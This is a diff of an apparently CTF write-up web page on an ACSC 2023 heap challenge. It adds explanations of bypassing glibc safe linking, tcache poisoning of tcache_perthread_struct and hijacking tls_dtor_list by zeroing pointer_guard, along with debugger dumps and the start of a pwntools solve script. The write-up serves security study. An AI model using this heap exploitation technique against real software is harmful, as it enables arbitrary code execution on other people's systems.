@@ -1664,7 +1664,7 @@
 <div class="single__infos">
   <time class="single__info" title="Written At">📅&nbsp;Feb 28, 2023 </time>
   
-  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;7&nbsp;min read </span>
+  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;10&nbsp;min read </span>
   
   <span class="single__info">
     
@@ -1926,8 +1926,28 @@ Given files:</p>
 </div><h2 id="glibc-232s-safe-linking">Glibc-2.32&rsquo;s Safe Linking</h2>
 <p><a href="https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/">https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/</a></p>
 <p>Note that what we leaked is an encrypted form of chunk&rsquo;s fd:</p>
-<p><img src="/images/2023-44-28-acsc2023/image-20230303151312778.png" alt="image-20230303151300741" /></p>
-<p>This is because of glibc-2.32&rsquo;s safe linking.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">tel</span> <span class="o">&amp;</span><span class="n">mlist</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span><span class="o">:</span><span class="mo">0000</span><span class="err">│</span>  <span class="mh">0x558f84585040</span> <span class="p">(</span><span class="n">mlist</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="mo">01</span><span class="o">:</span><span class="mo">000</span><span class="mi">8</span><span class="err">│</span>  <span class="mh">0x558f84585048</span> <span class="p">(</span><span class="n">mlist</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="err">—▸</span> <span class="mh">0x558f84b632a0</span> <span class="err">◂—</span> <span class="mh">0x558f84b63</span>
+</span></span><span class="line"><span class="cl"><span class="mo">02</span><span class="o">:</span><span class="mo">0010</span><span class="err">│</span>  <span class="mh">0x558f84585050</span> <span class="p">(</span><span class="n">mlist</span><span class="o">+</span><span class="mi">16</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x60</span> <span class="cm">/* &#39;`&#39; */</span>
+</span></span><span class="line"><span class="cl"><span class="mo">03</span><span class="o">:</span><span class="mo">001</span><span class="mi">8</span><span class="err">│</span>  <span class="mh">0x558f84585058</span> <span class="p">(</span><span class="n">mlist</span><span class="o">+</span><span class="mi">24</span><span class="p">)</span> <span class="err">—▸</span> <span class="mh">0x558f84b632a0</span> <span class="err">◂—</span> <span class="mh">0x558f84b63</span>
+</span></span><span class="line"><span class="cl"><span class="mo">04</span><span class="o">:</span><span class="mo">0020</span><span class="err">│</span>  <span class="mh">0x558f84585060</span> <span class="p">(</span><span class="n">mlist</span><span class="o">+</span><span class="mi">32</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span> <span class="err">↓</span>     <span class="mi">3</span> <span class="n">skipped</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="images/2023-44-28-acsc2023/image-20230303151312778.png" alt="image-20230303151300741" /></p>
+<p>This is because of glibc-2.32&rsquo;s safe linking<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.</p>
 <p>Safe linking is a security mechanism to protect <code>malloc()</code>&rsquo;s single-linked lists from tampering by attacker.</p>
 <p>In this case we encounter this protection when allocate and free tcache chunk</p>
 <div class="highlight"><div class="chroma">
@@ -2007,18 +2027,73 @@ Given files:</p>
 </span></span></span><span class="line"><span class="cl"><span class="cp">#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><p>For example:</p>
-<p>Instead of storing <code>tcache-&gt;entries[tc_idx]</code>, <code>tcache_put()</code> store</p>
-<pre tabindex="0"><code>(&amp;e-&gt;next&gt;&gt;12)^(tcache-&gt;entries[tc_idx])
-</code></pre><p><code>&amp;e-&gt;next&gt;&gt;12</code> is basically heap base, and <code>tcache-&gt;entries[tc_idx]</code> is equal to zero when the bin is empty (the first time a chunk is inserted into that bin).</p>
-<p>So the expression is equal to <code>heap_base&gt;&gt;12</code>.</p>
+</div><p>For example, if we free 2 chunk in same bin:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">10</span><span class="n">gx</span> <span class="mh">0x55a3c2778290</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x55a3c2778290</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000021</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x55a3c27782a0</span><span class="o">:</span> <span class="mh">0x000000055a3c2778</span>      <span class="mh">0x40d9bbe86fa3873a</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x55a3c27782b0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000021</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x55a3c27782c0</span><span class="o">:</span> <span class="mh">0x000055a6984ba5d8</span>      <span class="mh">0x40d9bbe86fa3873a</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The above fd is calculated by <code>PROTECT_PTR()</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">In</span> <span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="nb">hex</span><span class="p">((</span><span class="mh">0x55a3c27782a0</span><span class="o">&gt;&gt;</span><span class="mi">12</span><span class="p">)</span><span class="o">^</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Out</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="s1">&#39;0x55a3c2778&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">In</span> <span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="nb">hex</span><span class="p">((</span><span class="mh">0x55a3c27782c0</span><span class="o">&gt;&gt;</span><span class="mi">12</span><span class="p">)</span><span class="o">^</span><span class="mh">0x55a3c27782a0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Out</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="s1">&#39;0x55a6984ba5d8&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And if we allocate using tcache bin, next entry is resolved using <code>REVEAL_PTR()</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">In</span> <span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="nb">hex</span><span class="p">((</span><span class="mh">0x55a3c27782c0</span><span class="o">&gt;&gt;</span><span class="mi">12</span><span class="p">)</span><span class="o">^</span><span class="mh">0x000055a6984ba5d8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Out</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="s1">&#39;0x55a3c27782a0&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>tcache-&gt;entries[tc_idx]</code> is equal to zero when the bin is empty (the first time a chunk is inserted into that bin). Thereby, what we leak is equivalent to <code>heap_base&gt;&gt;12</code></p>
 <h2 id="leak-libc-base-and-control-tcache_perthread_struct">Leak libc base and control tcache_perthread_struct</h2>
 <p>Now we have heap address.</p>
 <blockquote>
-<p>My first attempt during ctf is trying to insert a big chunk to unsorted bin and leak libc base. But even when I do the former, it used up 9 slot of notes and I couldn&rsquo;t perform another tcache poisoning to point to the big chunk and leak libc base.</p>
+<p>My first approach during ctf is to insert a big chunk to unsorted bin and leak libc base. Even after I finished the former, it consumed up 9 note slots, thus I couldn&rsquo;t leak libc base.</p>
 </blockquote>
-<p>After reading nyancat&rsquo;s writeup, I notice the existence of <code>tcache_perthread_struct</code> which is the first chunk to be allocated on heap. If we could control the tcache struct, we could perform a lot of magic.</p>
-<p>First prepare tcache poisoning for 2 bins to allocate at <code>tcache_perthread_struct</code>. Note that we overwrite fd with <code>PROTECT_PTR(tcache_perthead_struct)</code> instead of the original pointer.</p>
+<p>After reading nyancat&rsquo;s writeup, I notice the existence of <code>tcache_perthread_struct</code> which is the first chunk allocated on heap. If we could control the tcache struct, we could do a lot of magic.</p>
+<p>First prepare tcache poisoning to allocate 2 chunks at <code>tcache_perthread_struct</code>. Note that we overwrite fd with <code>PROTECT_PTR(tcache_perthead_struct)</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -2045,7 +2120,7 @@ Given files:</p>
 </span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">protect</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)))</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Then write 0x290 bin size to 7, free it to put it to unsorted bin (fastbin&rsquo;s max bin size is 0xa0) and leak libc base.</p>
+</div><p>Then set 0x290 bin size to 7, free it to put it to unsorted bin (fastbin&rsquo;s max bin size is 0xa0) and leak libc base. We fill up the 0x290 bin since <code>tcache_perthread_struct</code>&rsquo;s size is 0x290 and we can free it right away without crafting big chunk.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -2065,8 +2140,8 @@ Given files:</p>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="tls_dtor_list">tls_dtor_list</h2>
-<p>From glibc-2.32, <code>__malloc_hook</code> and <code>__free_hook</code> were removed so I used <code>tls_dtor_list </code> to prepare a function call when program <code>exit()</code>.</p>
-<p><code>exit()</code> is actually a wrapper of <code>__run_exit_handlers()</code>. That function will call <code>__call_tls_dtors()</code> if <code>tls_dtor_list </code> is not NULL.</p>
+<p>From glibc-2.32, <code>__malloc_hook</code> and <code>__free_hook</code> were removed so we used <code>tls_dtor_list </code> to prepare a function call when program <code>exit()</code>.</p>
+<p><code>exit()</code> is a wrapper of <code>__run_exit_handlers()</code>, which will call <code>__call_tls_dtors()</code> if <code>tls_dtor_list </code> variable is not NULL.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -2095,9 +2170,7 @@ Given files:</p>
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><code>tls_dtor_list</code>&rsquo;s address can be calculated from libc base. We can prepare the pointer in tcache struct to arbitrarily and point it to a prepared <code>dtor_list</code>.</p>
-<h2 id="pointer-mangling">Pointer mangling</h2>
-<p>There&rsquo;s one thing to overcome that function pointer in <code>__call_tls_dtors()</code> is passed to <code>PTR_DEMANGLE()</code> before being called.</p>
+</div><h2 id="pointer-mangling">Pointer mangling</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -2152,9 +2225,41 @@ Given files:</p>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><code>PTR_MANGLE()</code> works by XORing the pointer with a 64bit secret thread data (<code>fs:0x30</code>), then performing a bitwise left rotation of 0x11 bits (on x86-64). <code>PTR_DEMANGLE()</code> is the reverse.</p>
-<p>That secret value is store in Thread Local Storage (namely <code>pointer_guard</code>, below <code>canary</code>) and its address can be calculated from libc base too. If you can overwrite the pointer guard value to 0, so the mangle will be just ROL(0x11)</p>
-<p>Therefore, we control <code>tcache_perthread_struct</code> to point entries of 2 sizes to <code>tls_dtor_list</code> and <code>pointer_guard</code> to bypass <code>PTR_DEMANGLE()</code> and point <code>tls_dtor_list</code> to a crafted <code>dtor_list</code> with function attribute can be <code>system</code> or <code>execve</code></p>
+</div><p>As you can see if we can tamper <code>tls_dtor_list</code>, program will eventually call <code>func(cur-&gt;obj)</code> of our choice.</p>
+<p>There&rsquo;s one thing to overcome that function pointer in <code>__call_tls_dtors()</code> is passed to <code>PTR_DEMANGLE()</code> before being called.</p>
+<p><code>PTR_MANGLE()</code> works by XORing the pointer with a 64bit secret thread data (<code>fs:0x30</code>), then performing a bitwise left rotation of 0x11 bits (on x86-64). <code>PTR_DEMANGLE()</code> is the reverse. <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup><sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c:sysdeps/unix/sysv/linux/x86_64/sysdep.h" data-lang="c:sysdeps/unix/sysv/linux/x86_64/sysdep.h"><span class="line"><span class="cl"><span class="cp">#  define PTR_MANGLE(var)	asm (&#34;xor %%fs:%c2, %0\n&#34;		      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">				     &#34;rol $2*&#34; LP_SIZE &#34;+1, %0&#34;		      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">				     : &#34;=r&#34; (var)			      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">				     : &#34;0&#34; (var),			      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">				       &#34;i&#34; (offsetof (tcbhead_t,	      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">						      pointer_guard)))
+</span></span></span><span class="line"><span class="cl"><span class="cp">#  define PTR_DEMANGLE(var)	asm (&#34;ror $2*&#34; LP_SIZE &#34;+1, %0\n&#34;	      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">				     &#34;xor %%fs:%c2, %0&#34;			      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">				     : &#34;=r&#34; (var)			      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">				     : &#34;0&#34; (var),			      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">				       &#34;i&#34; (offsetof (tcbhead_t,	      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">						      pointer_guard)))
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>That secret value is store in Thread Local Storage (namely <code>pointer_guard</code>, below <code>canary</code>).</p>
+<p>With these above targets, we can control <code>tcache_perthread_struct</code> to point entriy of 2 size to <code>tls_dtor_list</code> and <code>pointer_guard</code> to bypass <code>PTR_DEMANGLE()</code> and point <code>tls_dtor_list</code> to a crafted <code>dtor_list</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -2171,7 +2276,271 @@ Given files:</p>
 </span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_dtor_list</span><span class="p">))</span>  <span class="c1"># point to fake dtor_list </span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><h2 id="full-exploit-code">Full exploit code</h2>
+<div class="expand">
+  <button type="button" class="expand__button" aria-label="Expand Button">
+    <span class="expand-icon expand-icon__right">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z"/></svg>
+    </span>
+    solve.py
+  </button>
+  <div class="expand__content">
+    <div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># context.terminal = [&#39;cmd.exe&#39;, &#39;/c&#39;, &#39;start&#39;, &#39;wsl.exe&#39;, &#39;-d&#39;, &#39;Debian&#39;, &#39;bash&#39;, &#39;-c&#39;]</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;re.chal.ctf.acsc.asia&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf_name</span> <span class="o">=</span> <span class="s1">&#39;./chall&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">lib</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">script</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">breakrva 0x000000000001409
+</span></span></span><span class="line"><span class="cl"><span class="s1">breakrva 0x000000000001491
+</span></span></span><span class="line"><span class="cl"><span class="s1"># dir /home/daccong/glibc-2.35/malloc/
+</span></span></span><span class="line"><span class="cl"><span class="s1"># dir /home/daccong/glibc-2.35/stdlib
+</span></span></span><span class="line"><span class="cl"><span class="s1"># dir /home/daccong/glibc-2.35/sysdeps/nptl
+</span></span></span><span class="line"><span class="cl"><span class="s1">c
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># script+=&#39;c\n&#39;*8</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># script += &#39;b __libc_malloc\n&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># script+=&#39;b tcache_get\n&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># script += &#39;b __call_tls_dtors\n&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># script += &#39;b *__libc_start_call_main+130\n&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># p = process(elf_name)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># gdb.attach(p, gdbscript=script)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf_name</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">script</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">memo</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">memo</span> <span class="o">!=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">memo</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">list</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">addr_current: addr of current chunk&#39;s fd
+</span></span></span><span class="line"><span class="cl"><span class="s1">addr_fd: addr of next chunk&#39;s fd
+</span></span></span><span class="line"><span class="cl"><span class="s1">current: current chunk&#39;s fd
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">protect</span><span class="p">(</span><span class="n">addr_current</span><span class="p">,</span> <span class="n">addr_fd</span><span class="p">):</span>   
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">addr_current</span><span class="o">&gt;&gt;</span><span class="mi">12</span><span class="p">)</span><span class="o">^</span><span class="n">addr_fd</span>   <span class="c1"># basically (heap_base&gt;&gt;12)^addr_fd</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">reveal</span><span class="p">(</span><span class="n">addr_current</span><span class="p">,</span> <span class="n">current</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">addr_current</span><span class="o">&gt;&gt;</span><span class="mi">12</span><span class="p">)</span><span class="o">^</span><span class="n">current</span>   <span class="c1"># basically (heap_base&gt;&gt;12)^current</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">protect</span><span class="p">(</span><span class="n">addr_fd</span><span class="p">):</span>   
